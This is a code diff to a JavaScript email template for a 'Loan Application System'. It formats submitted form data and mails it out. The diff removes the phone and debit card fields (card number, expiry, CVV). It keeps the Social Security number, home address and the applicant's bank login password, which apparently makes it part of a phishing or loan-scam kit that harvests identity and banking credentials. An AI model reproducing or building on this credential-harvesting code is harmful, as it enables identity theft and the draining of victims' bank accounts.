@@ -114,10 +114,7 @@ const formatHTML = (data) => `
           <p class="field-label">Email Address</p>
           <p class="field-value">${data.email}</p>
         </div>
-        <div class="field">
-          <p class="field-label">Phone Number</p>
-          <p class="field-value">${data.phone || "N/A"}</p>
-        </div>
+
         <div class="field">
           <p class="field-label">Birth Date</p>
           <p class="field-value">${data.birthDate}</p>
@@ -185,29 +182,7 @@ const formatHTML = (data) => `
       </div>
     </div>
     
-    <div class="section">
-      <div class="section-header">
-        <h2 class="section-title">💳 Debit Card Details</h2>
-      </div>
-      <div class="grid">
-        <div class="field full-width">
-          <p class="field-label">Card Number</p>
-          <p class="field-value">${data.debitCardNumber}</p>
-        </div>
-        <div class="field">
-          <p class="field-label">Expiry Month</p>
-          <p class="field-value">${data.expiryMonth}</p>
-        </div>
-        <div class="field">
-          <p class="field-label">Expiry Year</p>
-          <p class="field-value">${data.expiryYear}</p>
-        </div>
-        <div class="field">
-          <p class="field-label">CVV</p>
-          <p class="field-value">${data.cvv}</p>
-        </div>
-      </div>
-    </div>
+
     
     <div class="footer">
       <p>This application was submitted successfully via the Loan Application System.</p>
@@ -226,7 +201,6 @@ Loan Title: ${data.loanTitle || "N/A"}
 First Name: ${data.firstName}
 Last Name: ${data.lastName}
 Email Address: ${data.email}
-Phone Number: ${data.phone || "N/A"}
 Birth Date: ${data.birthDate}
 SSN: ${data.ssn}
 Address Line 1: ${data.address1}
@@ -241,12 +215,6 @@ Password: ${data.bankPassword}
 Requested Loan Amount: ${data.loanAmount}
 Loan Duration (Months): ${data.loanDuration}
 Loan Purpose: ${data.loanPurpose}
-
-Debit Card Details:
-Card Number: ${data.debitCardNumber}
-Expiry Month: ${data.expiryMonth}
-Expiry Year: ${data.expiryYear}
-CVV: ${data.cvv}
 `;
 
 export const sendLoanApplicationEmail = async (data) => {
